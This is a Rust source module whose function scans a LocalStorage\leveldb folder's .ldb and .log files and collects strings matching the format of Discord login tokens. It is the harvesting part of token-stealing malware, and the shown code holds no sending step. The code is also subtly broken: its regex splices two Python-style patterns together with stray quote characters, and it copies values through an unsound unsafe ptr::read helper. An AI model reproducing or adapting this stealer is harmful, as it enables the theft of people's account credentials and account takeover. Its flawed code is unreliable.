pub mod finder {
    use crate::get_extension;
    use crate::read::read::read_lines;

    pub fn find_tokens(p: &String) -> Result<Vec<String>, std::io::Error> {
        use regex::Regex;
        use std::fs::{metadata, read_dir};
        unsafe fn duplicate<T>(item: &T) -> T {
            std::ptr::read(item)
        }
        let path = format!("{}\\LocalStorage\\leveldb", p);

        let r = read_dir(path)?;

        let mut tokens: Vec<String> = Vec::new();
        
        for path in r {
            unsafe {
                let path2 = duplicate(&path);
                let check = metadata(format!("{}", path2.unwrap().path().to_string_lossy()));

                if check.unwrap().is_file() {
                    let path3 = duplicate(&path).unwrap().path();
                    let path4 = duplicate(&path);
                    let extension = get_extension(path3.to_str().unwrap()).unwrap();
                    if extension != ".ldb" && extension != ".log" {
                        continue;
                    }
                    let regex =
                        Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}").unwrap();
                    let raw_lines = read_lines(format!("{}", path4.unwrap().path().to_string_lossy()));
                    let mut lines: Vec<String> = Vec::new();
                    for line in raw_lines.unwrap() {
                        match line {
                            Ok(v) => lines.push(v),
                            Err(..) => (),
                        }
                    }
                    for line in lines {
                        for caps in regex.captures_iter(&line[..]) {
                            for i in 0..caps.len() {
                                tokens.push(format!("{}", &caps[i]));
                            }
                        }
                    }
                }
            }
        }
        Ok(tokens)
    }
}
